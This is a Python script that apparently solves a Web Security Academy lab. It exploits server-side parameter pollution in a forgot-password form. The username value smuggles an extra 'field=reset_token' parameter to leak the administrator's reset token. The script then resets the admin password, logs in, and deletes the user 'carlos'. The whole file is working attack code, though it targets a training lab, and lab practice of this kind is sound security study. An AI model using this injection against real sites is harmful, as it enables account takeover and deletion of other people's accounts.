import requests
from bs4 import BeautifulSoup
import json 

LINK = "https://0a4f00d103dd98cc8156613a00940090.web-security-academy.net"
LOGIN_LINK = LINK + "/login"
RESET_PASSWORD_LINK = LINK + "/forgot-password"
ADMIN_DELETE_ROUTE = LINK + "/admin/delete"

s = requests.Session()

def reset_admin_password(passwd: str) -> bool:
    res = s.get(RESET_PASSWORD_LINK)
    csrf_token = BeautifulSoup(res.text,"html.parser").find("input",{"name":"csrf"})['value']

    payload = f"csrf={csrf_token}&username=administrator%26field=reset_token%23"

    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }

    res = s.post(RESET_PASSWORD_LINK,data=payload,headers=headers)
    reset_token = json.loads(res.text)['result']
    print("Reset Token: ",reset_token)
    link_for_reset = RESET_PASSWORD_LINK + "?reset_token=" + reset_token

    csrf_token = BeautifulSoup(s.get(link_for_reset).text,"html.parser").find("input",{"name":"csrf"})['value']
    
    data = {
        "csrf": csrf_token,
        "reset_token":reset_token,
        "new-password-1":passwd,
        "new-password-2":passwd
    }
    reset_passwd = s.post(RESET_PASSWORD_LINK,data=data)
    
    return reset_passwd.status_code == 200


def delete_user(admin_username:str,admin_passwd:str,victim_username: str) -> bool:
    csrf_token = BeautifulSoup(s.get(LOGIN_LINK).text,"html.parser").find("input",{"name":"csrf"})['value']

    data = {
        "csrf":csrf_token,
        "username":admin_username,
        "password":admin_passwd
    }

    login_request = s.post(LOGIN_LINK,data=data)
    if login_request.status_code == 200:
        print("Success!!!")
    else:
        print("Damn Failed")
        exit()
    
    delete_user = s.get(ADMIN_DELETE_ROUTE + "?username=" + victim_username)
    return delete_user.status_code == 200 



def main():
    print("Admin's password resetting to \"admin123\"")
    action = reset_admin_password("admin123")
    
    if action:
        print("Success!!!\n Password is changed to \"admin123\"")
    else:
        print("Damn, mession is failed")
    
    print("Login as a Admin")

    action = delete_user("administrator","admin123","carlos")
    
    if action:
        print("Mession passed")
    else:
        print("Damn")

if __name__ == '__main__':
    main()
